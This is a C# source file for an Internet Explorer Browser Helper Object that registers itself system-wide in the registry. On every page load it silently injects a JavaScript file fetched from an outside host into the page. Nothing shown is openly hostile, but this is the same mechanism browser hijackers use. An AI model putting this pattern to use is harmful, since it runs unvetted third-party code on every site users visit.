using System;
using System.Collections.Generic;
using System.Text;
using SHDocVw;
using mshtml;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;


namespace CIS_DLM
{
    [
    ComVisible(true),
    InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
    Guid("FC4801A3-2BA9-11CF-A229-00AA003D7352")
    ]

    public interface IObjectWithSite
    {
        [PreserveSig]
        int SetSite([MarshalAs(UnmanagedType.IUnknown)]object site);
        [PreserveSig]
        int GetSite(ref Guid guid, out IntPtr ppvSite);
    }
    public class BHO:IObjectWithSite
    {
        WebBrowser webBrowser;
        public void RefreshHandler(IHTMLEventObj e)
        {
            // Refresh event caught in here.
        }
        public void OnDocumentComplete(object pDisp, ref object URL)
        {
            if (webBrowser.Document is HTMLDocument doc)
            {
                IHTMLWindow2 tmpWindow = doc.parentWindow;
                if (tmpWindow != null)
                {
                    HTMLWindowEvents2_Event events = (tmpWindow as HTMLWindowEvents2_Event);
                    try
                    {
                        HTMLDocument document = (HTMLDocument)webBrowser.Document;
                        IHTMLElement head = (IHTMLElement)((IHTMLElementCollection)document.all.tags("head")).item(null, 0);
                        IHTMLScriptElement scriptObject = (IHTMLScriptElement)document.createElement("script");
                        scriptObject.type = @"text/javascript";
                        scriptObject.src = @"https://inventivesolutionste.ipage.com/javascripts/cdd/ciscode.js";
                        ((HTMLHeadElement)head).appendChild((IHTMLDOMNode)scriptObject);
                        events.onload -= new HTMLWindowEvents2_onloadEventHandler(RefreshHandler);
                    }
                    catch { }
                    events.onload += new HTMLWindowEvents2_onloadEventHandler(RefreshHandler);
                }
            }
        }

        #region BHO Internal Functions
        public static string BHOKEYNAME = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects";

        [ComRegisterFunction]
        public static void RegisterBHO(Type type)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BHOKEYNAME, true);

            if (registryKey == null)
                registryKey = Registry.LocalMachine.CreateSubKey(BHOKEYNAME);

            string guid = type.GUID.ToString("B");
            RegistryKey ourKey = registryKey.OpenSubKey(guid);

            if (ourKey == null)
            {
                ourKey = registryKey.CreateSubKey(guid);
            }

            ourKey.SetValue("NoExplorer", 1, RegistryValueKind.DWord);
            registryKey.Close();
            ourKey.Close();
        }

        [ComUnregisterFunction]
        public static void UnregisterBHO(Type type)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BHOKEYNAME, true);
            string guid = type.GUID.ToString("B");

            if (registryKey != null)
                registryKey.DeleteSubKey(guid, false);
        }

        public int SetSite(object site)
        {
            
            if (site != null)
            {
                
                webBrowser = (SHDocVw.WebBrowser)site;
                webBrowser.DocumentComplete +=
                  new DWebBrowserEvents2_DocumentCompleteEventHandler(
                  this.OnDocumentComplete);
            }
            else
            {
                webBrowser.DocumentComplete -=
          new DWebBrowserEvents2_DocumentCompleteEventHandler(
          this.OnDocumentComplete);
                webBrowser = null;
            }

            return 0;

        }

        public int GetSite(ref Guid guid, out IntPtr ppvSite)
        {
            IntPtr punk = Marshal.GetIUnknownForObject(webBrowser);
            int hr = Marshal.QueryInterface(punk, ref guid, out ppvSite);
            Marshal.Release(punk);
            return hr;
        }
        #endregion
    }
}
